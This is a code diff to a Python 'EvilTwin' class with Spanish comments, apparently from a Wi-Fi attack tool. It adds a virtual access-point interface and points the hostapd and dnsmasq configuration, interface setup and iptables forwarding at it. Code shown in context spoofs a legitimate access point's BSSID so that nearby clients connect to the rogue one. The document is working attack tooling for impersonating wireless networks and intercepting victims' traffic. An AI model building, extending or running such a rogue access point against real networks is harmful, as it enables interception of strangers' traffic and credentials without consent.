@@ -17,7 +17,8 @@ class EvilTwin:
     """
 
     def __init__(self, interface):
-        self.interface = interface
+        self.base_interface = interface
+        self.ap_iface = interface
         self.running = False
         self._hostapd_proc = None
         self._dnsmasq_proc = None
@@ -52,6 +53,24 @@ class EvilTwin:
             return "g"
         return "a" if ch >= 36 else "g"
 
+    def _create_ap_interface(self):
+        """Crea una interfaz virtual AP (wtrap_ap) sobre el mismo PHY."""
+        import re
+        res = subprocess.run(["iw", "dev", self.base_interface, "info"],
+                             capture_output=True, text=True)
+        phy = re.search(r'wiphy (\d+)', res.stdout)
+        if phy:
+            self.ap_iface = "wtrap_ap"
+            subprocess.run(["iw", "dev", self.ap_iface, "del"], capture_output=True)
+            subprocess.run(["iw", "phy", f"phy{phy.group(1)}", "interface",
+                            "add", self.ap_iface, "type", "__ap"], capture_output=True)
+        else:
+            self.ap_iface = self.base_interface
+
+    def _delete_ap_interface(self):
+        if hasattr(self, 'ap_iface') and self.ap_iface == "wtrap_ap":
+            subprocess.run(["iw", "dev", self.ap_iface, "del"], capture_output=True)
+
     def _spoof_bssid(self, bssid: str):
         """
         Clona la MAC del AP legítimo en la interfaz AP.
@@ -59,15 +78,15 @@ class EvilTwin:
         no distinguen el Evil Twin del AP real y conectan al de mayor señal.
         """
         subprocess.run(
-            ["ip", "link", "set", self.interface, "down"],
+            ["ip", "link", "set", self.ap_iface, "down"],
             capture_output=True
         )
         subprocess.run(
-            ["ip", "link", "set", self.interface, "address", bssid],
+            ["ip", "link", "set", self.ap_iface, "address", bssid],
             capture_output=True
         )
         subprocess.run(
-            ["ip", "link", "set", self.interface, "up"],
+            ["ip", "link", "set", self.ap_iface, "up"],
             capture_output=True
         )
 
@@ -83,7 +102,7 @@ class EvilTwin:
         bssid_line = f"bssid={bssid}\n" if bssid else ""
 
         if security == "WPA2":
-            conf = f"""interface={self.interface}
+            conf = f"""interface={self.ap_iface}
 driver=nl80211
 ssid={ssid}
 hw_mode={hw_mode}
@@ -96,7 +115,7 @@ wpa_key_mgmt=WPA-PSK
 rsn_pairwise=CCMP
 """
         else:
-            conf = f"""interface={self.interface}
+            conf = f"""interface={self.ap_iface}
 driver=nl80211
 ssid={ssid}
 hw_mode={hw_mode}
@@ -109,7 +128,7 @@ auth_algs=1
 
     def _write_dnsmasq_conf(self, upstream_dns="8.8.8.8"):
         """Genera el archivo de configuración de dnsmasq"""
-        conf = f"""interface={self.interface}
+        conf = f"""interface={self.ap_iface}
 bind-interfaces
 dhcp-range={self.dhcp_start},{self.dhcp_end},{self.subnet},12h
 dhcp-option=3,{self.gateway_ip}
@@ -124,11 +143,11 @@ log-dhcp
     def _setup_interface(self, channel):
         """Configura la interfaz y la IP del gateway"""
         cmds = [
-            f"ip link set {self.interface} down",
-            f"iw dev {self.interface} set type __ap",
-            f"ip link set {self.interface} up",
-            f"ip addr flush dev {self.interface}",
-            f"ip addr add {self.gateway_ip}/24 dev {self.interface}",
+            f"ip link set {self.ap_iface} down",
+            f"iw dev {self.ap_iface} set type __ap",
+            f"ip link set {self.ap_iface} up",
+            f"ip addr flush dev {self.ap_iface}",
+            f"ip addr add {self.gateway_ip}/24 dev {self.ap_iface}",
         ]
         for cmd in cmds:
             subprocess.run(cmd.split(), capture_output=True)
@@ -155,13 +174,13 @@ log-dhcp
         ], capture_output=True)
         subprocess.run([
             "iptables", "-A", "FORWARD",
-            "-i", self.interface,
+            "-i", self.ap_iface,
             "-o", out_interface, "-j", "ACCEPT"
         ], capture_output=True)
         subprocess.run([
             "iptables", "-A", "FORWARD",
             "-i", out_interface,
-            "-o", self.interface, "-j", "ACCEPT"
+            "-o", self.ap_iface, "-j", "ACCEPT"
         ], capture_output=True)
 
     def _disable_forwarding(self):
@@ -210,6 +229,7 @@ log-dhcp
 
         try:
             self._kill_conflicts()
+            self._create_ap_interface()
             self._write_hostapd_conf(ssid, channel, security,
                                      wpa_passphrase, target_bssid)
             self._write_dnsmasq_conf()
@@ -296,6 +316,7 @@ log-dhcp
 
         self._disable_forwarding()
         self._kill_conflicts()
+        self._delete_ap_interface()
 
         # Limpiar archivos temporales
         for f in [self.hostapd_conf, self.dnsmasq_conf]:
